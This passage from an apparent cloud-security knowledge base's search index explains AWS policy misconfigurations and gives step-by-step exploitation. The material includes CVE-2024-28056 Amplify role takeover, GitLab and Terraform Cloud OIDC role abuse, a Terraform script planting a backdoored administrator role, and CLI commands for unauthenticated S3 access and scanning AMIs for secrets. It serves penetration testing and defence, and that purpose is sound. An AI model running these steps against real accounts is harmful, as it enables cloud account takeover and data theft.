\"arn:aws:iam::111111111111:user/tester\"\n      },\n      \"Action\": [\n        \"SNS:GetTopicAttributes\",\n        \"SNS:SetTopicAttributes\"\n      ],\n      \"Resource\": \"arn:aws:sns:us-east-1:111111111111:test_topic\"\n    }\n  ]\n}\n</code></pre> This policy would permit the <code>tester</code> IAM user to perform <code>sns:GetTopicAttributes</code> and <code>sns:SetTopicAttributes</code> without the need for an <code>Allow</code> in the identity policies attached to the user.</p> <p>Note</p> <p>This behavior only applies to entities in the same AWS account. If the resource-based policy specified an IAM user in a different AWS account, that user would need to have an identity policy attached that allowed the action.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#not-policy-elements","title":"\u201cNot\u201d Policy Elements","text":"<p>Within the syntax for IAM policies in AWS exist three \u201cNot\u201d policy elements, NotPrincipal, NotAction, and NotResource. These elements have the inverse effect of their similarly named counterparts and, when paired with an <code>Allow</code>, can be a very serious misconfiguration.</p> <p>Because of this, policies which include these elements should be strictly scrutinized for potential misconfigurations.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#notprincipal","title":"NotPrincipal","text":"<p>The NotPrincipal element is used to specify which entity is not a part of the policy. When paired with an <code>Allow</code> this means that all entities (including those outside of the account) will be permitted to perform actions against the resource.</p> <p>For example, the following SNS access policy would permit any entity to perform <code>sns:GetTopicAttributes</code> except for the <code>jim</code> user.</p> <pre><code>{\n  \"Version\": \"2008-10-17\",\n  \"Id\": \"__default_policy_ID\",\n  \"Statement\": [\n    {\n      \"Sid\": \"__default_statement_ID\",\n      \"Effect\": \"Allow\",\n      \"NotPrincipal\": {\n        \"AWS\": \"arn:aws:iam::111111111111:user/jim\"\n      },\n      \"Action\": \"SNS:GetTopicAttributes\",\n      \"Resource\": \"arn:aws:sns:us-east-1:111111111111:test_topic\"\n    }\n  ]\n}\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#notaction","title":"NotAction","text":"<p>The NotAction element is used to specify all actions except the specified one. When paired with an <code>Allow</code> this means that all actions except the ones specified will be permitted. </p> <p>For example, the following SNS access policy would permit any entity the ability to perform all SNS actions except <code>sns:Publish</code>.</p> <pre><code>{\n  \"Version\": \"2008-10-17\",\n  \"Id\": \"__default_policy_ID\",\n  \"Statement\": [\n    {\n      \"Sid\": \"__default_statement_ID\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"NotAction\": \"SNS:Publish\",\n      \"Resource\": \"arn:aws:sns:us-east-1:111111111111:test_topic\"\n    }\n  ]\n}\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/#notresource","title":"NotResource","text":"<p>The NotResource element is used to specify all resources except the specified one. When paired with an <code>Allow</code> this means that if the resource is incorrect, or mistyped, the statement will evaluate to true.</p> <p>For example, the following SNS access policy for an SNS topic named <code>first_topic</code> would permit the user <code>jim</code> the ability to perform the <code>sns:GetTopicAttributes</code> action because the statement specifies a <code>NotResource</code> element of <code>second_topic</code>.</p> <pre><code>{\n  \"Version\": \"2008-10-17\",\n  \"Id\": \"__default_policy_ID\",\n  \"Statement\": [\n    {\n      \"Sid\": \"__default_statement_ID\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::222222222222:user/jim\"\n      },\n      \"Action\": \"SNS:GetTopicAttributes\",\n      \"NotResource\": \"arn:aws:sns:us-east-1:111111111111:second_topic\"\n    }\n  ]\n}\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploit_amplify_vulnerability_in_same_account_scenario/","title":"CVE-2024-28056: Exploit an AWS Amplify Vulnerability in Same-Account Scenarios","text":"<ul> <li> <p> Original Research</p> <p> <p>Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover by Nick Frichette</p> <p></p> </p> </li> <li> <p> Additional Resources</p> <p>AWS Security Bulletin: CVE-2024-28056</p> </li> </ul>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploit_amplify_vulnerability_in_same_account_scenario/#background","title":"Background","text":"<p>In April of 2024, Security Researchers at Datadog found a vulnerability in the AWS Amplify service that exposed IAM roles associated with the service to takeover. In particular, under two different scenarios the Amplify service was setting the role trust policies of certain roles to improperly limit which Cognito identity pool could assume them. As a result, anyone could create their own identity pool (or find one on the internet) and use it to assume these vulnerable roles.</p> <p>In response to this, AWS made a number of changes to IAM and the AWS Security Token Service (STS) APIs. In particular, this involved:</p> <ul> <li>Releasing a fix to the Amplify CLI and Amplify Studio preventing the creation of more vulnerable roles.</li> <li>Made changes to the IAM control plane to prevent anyone from creating role trust policies vulnerable to this misconfiguration. If you try to set a vulnerable policy today it will be rejected.</li> <li>Made changes to the STS service to block cross-account role assumption of roles that have a vulnerable trust relationship with the Amazon Cognito service.</li> </ul> <p>This final fix is interestingly specific. AWS only made changes to block cross-account role assumption, not same-account role assumption. As a result of this, we can still potentially take advantage of roles that were made vulnerable by the Amplify service. This requires an identity pool to be configured in the victim account with the basic (classic) authflow enabled.</p> <p>Warning</p> <p>To be clear, this method is more difficult and requires the existence of at least one additional misconfigured resource, however it is worthwhile to know about if you are a Penetration Tester or Red Teamer, or you simply use Amplify in your own organization.</p> <p>Note</p> <p>This is not realistically something that can be \"fixed\". AWS was able to block cross-account role assumption because it was a sufficiently rare occurrence. By comparison, same-account role assumption using Cognito is (as of today) the only method available. If you have IAM roles in your account which are vulnerable to this exposure it is recommended to delete them, or change their trust policy in addition to relying on the fixes that AWS provided.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploit_amplify_vulnerability_in_same_account_scenario/#unauthenticated-example","title":"Unauthenticated Example","text":"<p>In this scenario, there exists a vulnerable role in the account, alongside an identity pool that has the basic authflow enabled. This role's trust policy does not require authentication to assume. Here is an example of a vulnerable trust policy:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Federated\": \"cognito-identity.amazonaws.com\"\n            },\n            \"Action\": \"sts:AssumeRoleWithWebIdentity\"\n        }\n    ]\n}\n</code></pre> <p>Note</p> <p>There is another variant of this misconfiguration where the trust policy includes a condition for <code>cognito-identity.amazonaws.com:amr</code> that is set to <code>unauthenticated</code>.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploit_amplify_vulnerability_in_same_account_scenario/#steps-to-exploit","title":"Steps to Exploit","text":"<p>In order to assume a role that has this vulnerable trust policy, follow these steps:</p> <ol> <li>Using the AWS CLI, perform the following command: <code>aws cognito-identity get-id --identity-pool-id &lt;victim identity pool id&gt;</code><ul> <li>This can typically be found in the client side JavaScript of the web application using this identity pool.</li> </ul> </li> <li>Using the <code>IdentityId</code> from step one, perform the following command: <code>aws cognito-identity get-open-id-token --identity-id &lt;identity id from step 1&gt;</code><ul> <li>This will return a JWT we can use to authenticate to the vulnerable role. You can inspect this JWT if you so choose.</li> </ul> </li> <li>With this JWT, perform the following command: <code>aws sts assume-role-with-web-identity --role-arn &lt;vulnerable role ARN&gt; --role-session-name &lt;session name of your choosing&gt; --web-identity-token &lt;JWT from step 2&gt;</code><ul> <li>The vulnerable role ARN will need to be brute-forced, derived from other values, found in source control, or a variety of other means.</li> </ul> </li> </ol> <p>By following these steps you should successfully generate IAM credentials for the vulnerable role:</p> <pre><code>{\n    \"Credentials\": {\n        \"AccessKeyId\": \"ASIA123ABC456DEF789G\",\n        \"SecretAccessKey\": \"123ABC456DEF789G123ABC456DEF789GHI012JKL\",\n        \"SessionToken\": \"...snip...\",\n        \"Expiration\": \"2024-07-31T20:02:33+00:00\"\n    },\n    \"SubjectFromWebIdentityToken\": \"us-east-1:00000000-1111-2222-3333-444444444444\",\n    \"AssumedRoleUser\": {\n        \"AssumedRoleId\": \"AROA123ABC456DEF789G:hijacked_role\",\n        \"Arn\": \"arn:aws:sts::111111111111:assumed-role/vulnerable-amplify-role/hijacked_role\"\n    },\n    \"Provider\": \"cognito-identity.amazonaws.com\",\n    \"Audience\": \"us-east-1:aaaaaaaa-1111-bbbb-2222-cccccccccccc\"\n}\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploit_amplify_vulnerability_in_same_account_scenario/#authenticated-example","title":"Authenticated Example","text":"<p>In an authenticated scenario, the identity pool in the victim account must be configured to support authentication with a Cognito user pool. An example vulnerable role trust policy can be found below:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"\",\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Federated\": \"cognito-identity.amazonaws.com\"\n            },\n            \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n            \"Condition\": {\n                \"ForAnyValue:StringLike\": {\n                    \"cognito-identity.amazonaws.com:amr\": \"authenticated\"\n                }\n            }\n        }\n    ]\n}\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploit_amplify_vulnerability_in_same_account_scenario/#steps-to-exploit_1","title":"Steps to Exploit","text":"<p>In order to assume a role that has this vulnerable trust policy, follow these steps:</p> <ol> <li>First, find credentials for a user account in the pool. If you cannot steal or create credentials you cannot continue.</li> <li>Authenticate to the user pool using cognito-idp:InitiateAuth. The specific command you will need to use will differ depending on the type of authentication in place. Please refer to the documentation for more information. Here we will demonstrate using <code>USER_PASSWORD_AUTH</code>.<ul> <li>Run the following command: <code>aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id &lt;client id of the victim user pool&gt; --auth-parameters USERNAME=&lt;username&gt;,PASSWORD=&lt;password&gt;</code></li> <li>This will return an <code>IdToken</code> that will be used in the next step.</li> <li>Note: The <code>AccessToken</code> is NOT the same as the <code>IdToken</code>. </li> </ul> </li> <li>Run the following command: <code>aws cognito-identity get-id --identity-pool-id &lt;victim identity pool id&gt; --logins '{\"cognito-idp.&lt;region&gt;.amazonaws.com/&lt;victim user pool id&gt;\":\"&lt;IdToken from step 2&gt;\"}'</code><ul> <li>This will return an <code>IdentityId</code> that will be used in the next step.</li> </ul> </li> <li>Run the following command: <code>aws cognito-identity get-open-id-token --identity-id &lt;IdToken from step 3&gt; --logins '{\"cognito-idp.us-east-1.amazonaws.com/&lt;victim user pool id&gt;\":\"&lt;IdToken from step 2&gt;\"}'</code><ul> <li>Note: You MUST include the <code>logins</code> parameter, it is not optional.</li> <li>This will return a JWT we will use in the next step.</li> </ul> </li> <li>With this JWT, perform the following command: <code>aws sts assume-role-with-web-identity --role-arn &lt;vulnerable role ARN&gt; --role-session-name &lt;session name of your choosing&gt; --web-identity-token &lt;JWT from step 4&gt;</code></li> </ol> <p>By following these steps you should successfully generate IAM credentials for the vulnerable role.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploiting_misconfigured_gitlab_oidc_aws_iam_roles/","title":"Exploiting Misconfigured GitLab OIDC AWS IAM Roles","text":"<p>OpenID Connect (OIDC) is a common technology used to authorize services outside of AWS to assume IAM roles. As has been shown many times in the past (examples: one, two, and three), these roles can be misconfigured, permitting anyone in the world the ability to assume a vulnerable role.</p> <p>In this article, we will explain a potential misconfiguration of AWS IAM roles when using GitLab OIDC, walk through how to exploit them step-by-step, and explain how the AWS Console causes this misconfiguration by default.</p> <p>Warning</p> <p>In this article, we are only covering misconfigured roles with a trust relationship to the gitlab.com SaaS offering. In theory this attack could be performed on a self-hosted version of GitLab as well, however we have not tried it. If you have, feel free to open a pull request and update this article as needed.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploiting_misconfigured_gitlab_oidc_aws_iam_roles/#iam-role-misconfiguration-using-gitlab-oidc","title":"IAM role misconfiguration using GitLab OIDC","text":"<p>According to the GitLab documentation, AWS IAM roles that are using OIDC to authenticate should have a trust policy that looks like the following:</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Federated\": \"arn:aws:iam::AWS_ACCOUNT:oidc-provider/gitlab.com\"\n      },\n      \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n      \"Condition\": {\n        \"StringEquals\": {\n          \"gitlab.com:sub\": \"project_path:mygroup/myproject:ref_type:branch:ref:main\"\n        }\n      }\n    }\n  ]\n}\n</code></pre> <p>There are several important elements of this trust policy including:</p> <ul> <li><code>Principal.Federated</code>: This is the identity provider that authorizes the role assumption. It is important to note that while each AWS account will have its own identity provider, this is simply a stand-in for the global <code>gitlab.com</code> provider. </li> <li><code>Action</code>: This is the specific type of assume role being used. In this case it is sts:AssumeRoleWithWebIdentity.</li> <li><code>gitlab.com:sub</code>: This is an optional condition which restricts the group, project, or branch which is permitted to assume the role.</li> </ul> <p>The word \"optional\" from the previous sentence is why this attack is possible. There is no requirement to include a condition which restricts which specific group or project is permitted to assume a role. As a result of this anyone with access to gitlab.com could assume a role with this misconfiguration.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploiting_misconfigured_gitlab_oidc_aws_iam_roles/#how-to-exploit-this-misconfiguration","title":"How to exploit this misconfiguration","text":"<p>In this situation we will assume a role that has the following trust policy:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n            \"Principal\": {\n                \"Federated\": \"arn:aws:iam::AWS_ACCOUNT:oidc-provider/gitlab.com\"\n            },\n            \"Condition\": {\n                \"StringEquals\": {\n                    \"gitlab.com:aud\": [\n                        \"https://gitlab.com\"\n                    ]\n                }\n            }\n        }\n    ]\n}\n</code></pre> <p>Note</p> <p>In this example there is no condition on the <code>sub</code> field, restricting who is permitted to assume the role. This is the default trust policy that is set when creating a role through the AWS Console. More on this later. </p> <p>To exploit this misconfigured role, we must generate a JWT that can be used to authorize the sts:AssumeRoleWithWebIdentity invocation. To do this, create an account on gitlab.com or use an existing one.</p> <p>Next, create a project, and in this newly created project, create a file called <code>.gitlab-ci.yml</code>. This is the configuration file for GitLab CI. Add the following content to the <code>.gitlab-ci.yml</code> file:</p> <pre><code>assume role:\n  id_tokens:\n    GITLAB_OIDC_TOKEN:\n      aud: https://gitlab.com\n  script:\n    - echo ${GITLAB_OIDC_TOKEN} | base64 -w 0\n</code></pre> <p>Warning</p> <p>The <code>base64 -w 0</code> is required because GitLab will mask the output if you simply echo the <code>GITLAB_OIDC_TOKEN</code>. </p> <p>After adding this content to the <code>.gitlab-ci.yml</code> file, navigate to \"Build &gt; Jobs\" on the left side, and click on the most recent CI job. Here you should see the OIDC token that we base64 encoded.</p> <p></p> <p>From here, decode the base64 encoded blob (<code>base64 -d</code>) to get the original <code>GITLAB_OIDC_TOKEN</code>. This is the JWT you will use in the following sts:AssumeRoleWithWebIdentity call.</p> <p>Note</p> <p>You can optionally decode this value to see that the issuer is <code>https://gitlab.com</code>. This is what is being validated in the sts:AssumeRoleWithWebIdentity and because there is no condition on the <code>sub</code> field, we are able to assume the misconfigured role.</p> <pre><code>nick.frichette@host ~ % aws sts assume-role-with-web-identity \\\n--role-arn &lt;ARN of misconfigured role&gt;\n--role-session-name &lt;session name of your choosing&gt;\n--web-identity-token  &lt;JWT from previous step&gt;\n{\n    \"Credentials\": {\n        \"AccessKeyId\": \"ASIAEXAMPLE123EXAMPL\",\n        \"SecretAccessKey\": \"EXAMPLE123EXAMPLE123EXAMPLE123EXAMPLE123\"\n        \"SessionToken\": \"[..snip..]\",\n        \"Expiration\": \"2024-09-01T23:20:01+00:00\"\n    },\n    \"SubjectFromWebIdentityToken\": \"project_path:secres/runner-test:ref_type:branch:ref:main\",\n    \"AssumedRoleUser\": {\n        \"AssumedRoleId\": \"AROAEXAMPLE123EXAMPL:blah\",\n        \"Arn\": \"arn:aws:sts::111111111111:assumed-role/vuln-gitlab-runner-role/blah\"\n    },\n    \"Provider\": \"arn:aws:iam::111111111111:oidc-provider/gitlab.com\",\n    \"Audience\": \"https://gitlab.com\"\n}\n</code></pre> <p>You have successfully used a JWT generated from gitlab.com to assume a misconfigured IAM role!</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploiting_misconfigured_gitlab_oidc_aws_iam_roles/#how-the-aws-console-causes-this-misconfiguration-by-default","title":"How the AWS console causes this misconfiguration by default","text":"<p>If you've been following along, you may wonder, \"Why would anyone make this misconfiguration? The GitLab documentation provides an example that is secure\". Misconfigurations occur for a wide variety of reasons and in a wide variety of scenarios, however this one may have a more clear cut reason. </p> <p>When creating IAM roles in the AWS console, developers can choose a <code>trusted entity</code> for <code>Web identity</code>. This will pre-populate the trust policy of the IAM role and generally makes things easier. However, when a developer chooses <code>Web identity</code> and selects <code>gitlab.com</code> as the identity provider, there is no requirement for a condition on the <code>sub</code> field. Using the AWS console to create the IAM role will generate a vulnerable role by defualt.</p> <p></p> <p></p> <p>Compare this behavior to GitHub Actions or Terraform Cloud. In both of these situations, AWS made changes to the AWS Console to require additional fields to mitigate this type of attack.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploiting_misconfigured_gitlab_oidc_aws_iam_roles/#how-to-block-this-attack-using-rcps","title":"How to block this attack using RCPs","text":"<p>Recently, the Resource Control Policy (RCP) examples repository added examples on how to block this type of attack using RCPs. The example Resource Control Policy can block an external attacker from assuming your vulnerable role. </p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/","title":"Exploiting Misconfigured Terraform Cloud OIDC AWS IAM Roles","text":"<ul> <li> <p> Original Research</p> <p> <p>Addressed AWS defaults risks: OIDC, Terraform and Anonymous to AdministratorAccess by Eduard Agavriloae</p> <p></p> </p> </li> </ul> <p>OIDC stands for OpenID Connect and is an identity layer built on top of the OAuth 2.0 protocol. In AWS, OIDC can be used to federate identities from external identity providers, such as Google, Facebook or Terraform, allowing users to access AWS resources using their existing third-party accounts.</p> <p>OIDC is useful because instead of creating a set of AWS access keys for a user with administrator permissions and worry that they might get exposed, you can configure an IAM role with OIDC for Terraform Cloud to assume.</p> <p></p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/#iam-role-misconfiguration-using-terraform-cloud-oidc","title":"IAM role misconfiguration using Terraform Cloud OIDC","text":""},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/#part-of-the-past-as-of-7th-of-february","title":"Part of the past as of 7th of February","text":"<p>When the issue was first documented, the presence of this misconfiguration was partially facilitated by AWS. If you were to create from the web portal a new IAM role for Terraform Cloud, by default the role's trust policy would look like this:</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n       \"Effect\": \"Allow\",\n       \"Principal\": {\n         \"Federated\": \"arn:aws:iam::&lt;aws-account-id&gt;:oidc-provider/app.terraform.io\"\n       },\n       \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n       \"Condition\": {\n         \"StringEquals\": {\n            \"app.terraform.io:aud\": \"aws.workload.identity\"\n         }\n       }\n    }\n  ]\n}\n</code></pre> <p>This trust role policy is missing the \"app.terraform.io:sub\" condition. Essentially, the present misconfiguration allows anyone to assume this role. As documented by Terraform Cloud, you need to specify your organization through the subject condition like below to limit the access to this role:</p> <pre><code>\"Condition\": {\n    \"StringEquals\": {\n      \"app.terraform.io:aud\": \"aws.workload.identity\"\n    },\n    \"StringLike\": {\n      \"app.terraform.io:sub\": \"organization:&lt;your-terraform-organization&gt;:project:&lt;project&gt;:workspace:&lt;workspace&gt;:run_phase:&lt;run_phase&gt;\"\n    }\n}\n</code></pre> <p>Well, AWS made some changes and now they require from the start to specify the Organization, Project, Workspace, and Run Phase. Even more, now you can't create Terraform Cloud OIDC roles that don't have the subject condition.</p> <p></p> <p>And for anyone who had a role for Terraform Cloud without the subject, on 8th of November 2024 AWS sent a notification that announced two things:</p> <ul> <li>Starting 7th of November 2024 you will not be able to create new Terraform Cloud roles without the subject condition</li> <li>Starting 7th of February 2025 the subject condition will be enforced for these roles (so most likely the misconfigured roles will not work anymore afterwards)   </li> </ul> <p></p> <p>So while you might still be able to find roles misconfigured like this (without the subject condition), just be aware that the attack against it most likely will not work starting from 7th of February 2025.</p> <p>Can you still exploit misconfigured Terraform Cloud OIDC roles? Yes.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/#the-present-misconfiguration","title":"The present misconfiguration","text":"<p>These roles can still be misconfigured. All it takes is an asterisks in the organization's name.</p> <p></p> <p>So let's say we identified a role with the next trust policy:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Federated\": \"arn:aws:iam::259230201556:oidc-provider/app.terraform.io\"\n            },\n            \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n            \"Condition\": {\n                \"StringEquals\": {\n                    \"app.terraform.io:aud\": \"aws.workload.identity\"\n                },\n                \"StringLike\": {\n                    \"app.terraform.io:sub\": \"organization:hackingthe*:project:blog:workspace:prod-front-end:run_phase:*\"\n                }\n            }\n        }\n    ]\n}\n</code></pre> <p>Notice the asterisk from the organization's name. Because the value is <code>hackingthe*</code>, we should be able to assume this role as described in the next section.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/#exploitation","title":"Exploitation","text":"<p>Go to Terraform Cloud, create an account (it's free) and:</p> <ul> <li>Create an organization that follows the mentioned pattern: <code>hackingthe-*</code></li> <li>Create a project named <code>blog</code></li> <li>Create a workspace named <code>prod-front-end</code></li> </ul> <p>The <code>run_phase</code> is usually an asterisk as it's values refer to the stages that occur during a Terraform operation: plan, policy check and apply.</p> <p>The next step involves configuring the next two variables in Terraform Cloud:</p> <ul> <li>TFC_AWS_PROVIDER_AUTH: true<ul> <li>This will tell Terraform Cloud to authenticate with AWS</li> </ul> </li> <li>TFC_AWS_RUN_ROLE_ARN: arn:aws:iam:::role/<ul> <li>This will tell Terraform Cloud what role to assume</li> </ul> <p></p> <p>Prepare a Terraform script of your choice. Here is an example that wil create a backdoored role with administrator permissions. Please make sure you are authorized to perform this test.</p> <pre><code># here we need to set the the details of our organization\nterraform {\n  cloud {\n    organization = \"hackingthe-anything\"\n    workspaces {\n      name = \"prod-front-end\"\n    }\n  }\n}\n\n# region can be anything if you create only IAM resources\nprovider \"aws\" {\n  region = \"eu-central-1\"\n}\n\n# create role named \"AWSServicesRoleForAutomation\" that can be assumed from an external AWS account\nresource \"aws_iam_role\" \"create_role\" {\n  name               = \"AWSServicesRoleForAutomation\"\n  assume_role_policy = jsonencode({\n    \"Version\" : \"2012-10-17\",\n    \"Statement\": [\n      {\n        \"Effect\": \"Allow\",\n        \"Principal\": {\n          \"AWS\": \"arn:aws:iam::&lt;external-aws-account&gt;:root\"\n        },\n        \"Action\": \"sts:AssumeRole\",\n        \"Condition\": {}\n      }\n    ]\n  })\n}\n\n# attach administrator level permissions to this role\nresource \"aws_iam_policy_attachment\" \"create_role_backdoor\" {\n  name       = \"create_role_backdoor\"\n  roles      = [aws_iam_role.create_role.name]\n  policy_arn = \"arn:aws:iam::aws:policy/AdministratorAccess\"\n}\n</code></pre> <p>Save this to <code>main.tf</code>, login in terraform CLI and apply the changes.</p> <pre><code>terraform login\nterraform init\nterraform apply\n</code></pre> <p>Now the role should be created and you can try to assume it from the external AWS account.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/#how-to-block-this-attack-using-rcps","title":"How to block this attack using RCPs","text":"<p>Recently, the Resource Control Policy (RCP) examples repository added examples on how to block this type of attack using RCPs. The example Resource Control Policy can block an external attacker from assuming your vulnerable role.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/","title":"Exploiting Public AWS Resources - CLI Attack Playbook","text":"<ul> <li> <p> Tools mentioned in this article</p> <p>CloudShovel: A tool for scanning public or private AMIs for sensitive files and secrets</p> <p>coldsnap: A command line interface for Amazon EBS snapshots</p> </li> </ul> <p>This playbook shows how to exploit AWS resources that can be misconfigured to be publicly accessible. Think of it as a glossary of quick exploitation techniques that can be performed programmatically. </p> <p>All attacks are meant to be executed from an external environment where the attacker is ideally an administrator. </p> <p>The document is split in two categories: 1. Services and resources that can be found from a black-box perspective with little to reasonable effort 2. Services and resources that require information that can't be obtained through enumeration or brute-force</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#1-can-be-found-from-black-box-perspective","title":"1. Can be found from black-box perspective","text":"<p>These services might be found from Awseye, Google Dorking, enumeration, searchable via AWS account ID and other sane methods.</p>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#s3-buckets","title":"S3 Buckets","text":""},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#public-list-read-and-write","title":"Public List, Read and Write","text":"<p>Misconfiguration:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"PublicReadWrite\",\n            \"Effect\": \"Allow\",\n            \"Principal\": \"*\",\n            \"Action\": [\n                \"s3:ListBucket\",\n                \"s3:GetObject\",\n                \"s3:PutObject\"\n            ],\n            \"Resource\": [\n                \"arn:aws:s3:::example-bucket\",\n                \"arn:aws:s3:::example-bucket/*\"\n            ]\n        }\n    ]\n}\n</code></pre> <pre><code>bucket_name=\"example-bucket\"\nregion=\"region\"\n\n# List bucket contents via HTTP\ncurl https://$bucket_name.s3.$region.amazonaws.com/\n\n# List bucket contents via CLI unauthenticated\n# --no-sign-request will perform the API call unauthenticated\naws --no-sign-request s3 ls s3://$bucket_name\n\n# List all objects including in subfolders unauthenticated\naws --no-sign-request s3api list-objects-v2 --bucket $bucket_name\n\nfile_name=\"target-file\"\n\n# Download file from bucket unauthenticated\naws --no-sign-request s3 cp s3://$bucket/$file_name .\n\n# Upload file unauthenticated\n# Files with same name are overwritten\necho \"hackingthe.cloud\" &gt; $file_name.new\naws --no-sign-request s3 cp $file_name.new s3://$bucket/\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#authenticated-list-and-write","title":"Authenticated List and Write","text":"<p>Misconfiguration: - ACL misconfigured at object level so that only authenticated identities can access the file</p> <pre><code>bucket_name=\"example-bucket\"\nregion=\"region\"\n\n# This will not work anymore\ncurl https://$bucket_name.s3.$region.amazonaws.com/\n\n# List bucket contents via authenticated CLI\naws s3 ls s3://$bucket_name\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#s3-static-website-list-unauthenticated","title":"S3 Static Website List Unauthenticated","text":"<p>Misconfiguration: - Static website allowing bucket to be listed</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"PublicReadGetIndex\",\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"*\"\n            },\n            \"Action\": [\n                \"s3:ListBucket\",\n                \"s3:GetObject\"\n            ],\n            \"Resource\": [\n                \"arn:aws:s3:::example-bucket\",\n                \"arn:aws:s3:::example-bucket/*\"\n            ]\n        }\n    ]\n}\n</code></pre> <pre><code>bucket_name=\"example-bucket\"\nregion=\"region\"\n\n# This will return the index.html\ncurl https://$bucket_name.s3-website.$region.amazonaws.com\n\n# Removing the '-website' from the URL will list the files\n# This works because the bucket is misconfigured\ncurl https://$bucket_name.s3.$region.amazonaws.com\n\n# List bucket contents via CLI authenticated or unauthenticated\naws s3 ls s3://$bucket_name\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#amis","title":"AMIs","text":"<pre><code># Find the target AMI\n# Mention '--include-deprecated' to make sure you get all results\n# You'll have to search across every region since AMI is region dependent\n\n# Search by owner account\naws --region $region ec2 describe-images --owner 123456789012 --include-deprecated\n\n# Search by description or title\naws ec2 describe-images --filter Name=\"description\",Values=\"*hackingthe.cloud*\" --include-deprecated\naws ec2 describe-images --filter Name=\"name\",Values=\"*hackingthe.cloud*\" --include-deprecated\n\n# Automatically scan the AMI with cloudshovel\n# --bucket will specify where to save the files\n# This will not work if multiple cloudshovel is executed\n# multiple times in the same environment\ncloudshovel --region $region --bucket example-bucket ami-example1234567890\n\n# Manual approach\n# Start an EC2 instance based on the target AMI and save\n# the instance ID returned\n# Create a security group that allows all inbound traffic if\n# you don't already have one and use it here\n# If the command fails then you might have to use another instance-type like c5.large\n# You can specify '--no-associate-public-ip-address' if you don't want the instance\n# to have a public IP, but you'll need a VPC Endpoint to connect to it via\n# ec2-isntance-connect\naws ec2 run-instances --security-group-ids sg-example1234567890 --instance-type t2.micro --image-id ami-example1234567890 \n\n# Try to connect to it using EC2 Instance Connect. The instance\naws ec2-instance-connect ssh --os-user root --instance-id i-example1234567890\n# Search for files and secrets once connected\n# If the command fails then most likely you'll have to \n# use the different method to access the AMI\n# 1. You can use cloudshovel\n# 2. Make an EBS Snapshot of the volume(s) and download them with coldsnap\n\n# When you're done you can terminate the instance\naws ec2 terminate-instances --instance-ids $instance_id\n</code></pre>"},{"location":"aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/#ebs-snapshots","title":"EBS Snapshots","text":"<pre><code>region=region\n\n# Search by AWS account ID\naws ec2 describe-snapshots --owner-ids 123456789012\n\n# Search by 